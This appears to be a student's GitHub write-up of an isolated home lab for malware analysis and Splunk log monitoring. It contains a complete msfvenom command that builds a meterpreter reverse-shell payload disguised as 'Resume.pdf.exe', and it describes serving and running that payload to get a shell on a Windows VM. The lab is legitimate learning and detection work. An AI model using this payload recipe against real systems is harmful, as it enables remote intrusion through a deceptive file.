# Cybersecurity Home Lab

## Objective and purpose
The purpose of this home lab project was to build a safe, isolated environment to practice core cybersecurity skills — specifically malware analysis, host-based forensics, and basic adversary simulation — without putting the host system or network at risk.

Using Kali Linux as the attacker machine and a Windows 10 virtual machine as the target, I created a custom piece of basic malware and executed it in a controlled internal network setup. The goal was to analyze its behavior and observe its impact using system tools and a SIEM (Splunk).

## Skills Demonstrated
- Safe malware execution and containment using snapshots
- Basic malware creation with msfvenom
- Manual reverse shell exploitation using meterpreter
- Command-line reconnaissance techniques
- Log analysis and event correlation in Splunk
- Virtual networking and system hardening awareness

### Tools & Technologies Used
* VirtualBox – for managing virtual machines and internal networking
- Kali Linux VM – attacker machine to craft and deploy malware
- Windows 10 VM – target/test environment
- Splunk – SIEM for telemetry and event log collection
- Command-line tools – net user, net localgroup, ipconfig.
- Snapshot management – for safe rollback during malware testing



### Malware Overview
The malware was a basic reverse shell payload, named Resume.pdf.exe. It was generated using msfvenom on Kali Linux, designed to simulate a social engineering attack. 
        msfvenom -p windows/meterpreter/reverse_tcp LHOST=<kali_ip> LPORT=4444 -f exe > Resume.pdf.exe

## Malware Behavior
- When executed on the Windows VM, the malware initiates a reverse connection to the Kali Linux attacker's handler
- It spawns cmd.exe as its parent process
- Once the connection is established, the attacker can interact with the victim machine using a meterpreter shell.


## Attack Summary
1. Prepared internal-only virtual network for safe malware testing.

2. Created malware on Kali Linux and hosted it on a simple HTTP server.

3. Downloaded and executed the malware on the Windows VM.

4. From the Kali Linux handler, established a shell on the Windows machine.

5. Executed reconnaissance commands:

        net user

        net localgroup

        ipconfig

6. Used Splunk to analyze logs and monitor process behavior and network activity.

7. Observed process tree:
Resume.pdf.exe → cmd.exe → system commands




## Screenshots

1. Configured the Windows VM and the Linux VM to be on a secure internal network

Windows VM
<img width="971" height="310" alt="Screenshot 1" src="https://github.com/user-attachments/assets/3510690b-2b80-4667-a307-3a966222b6ca" />

Kali Linux VM
<img width="970" height="364" alt="Screenshot 2" src="https://github.com/user-attachments/assets/39c00137-e94a-4d17-98ce-783fb461a120" />



2. Snapshots taken for reverting VMs

Windows VM
<img width="1389" height="778" alt="Screenshot 3" src="https://github.com/user-attachments/assets/ed7f9954-71b1-43c1-a052-caa4eb2e7eb1" />

Kali Linux VM
<img width="1387" height="778" alt="Linux VM Snapshots" src="https://github.com/user-attachments/assets/78269724-f8f8-4299-aee6-bf263736424d" />

3. Set up http server so test machine can download the malware
<img width="1069" height="811" alt="Screenshot 5" src="https://github.com/user-attachments/assets/af32e2f3-8742-4099-9e6f-c2eec7beb421" />







4. Generating Telemetry (Splunk)

Parent Image Resume.pdf.exe spawned cmd.exe which then ran net user, net localgroup and ipconfig.
<img width="865" height="530" alt="Screenshot 6" src="https://github.com/user-attachments/assets/3474b1ca-baa3-4982-89e0-ccd8c57bb796" />
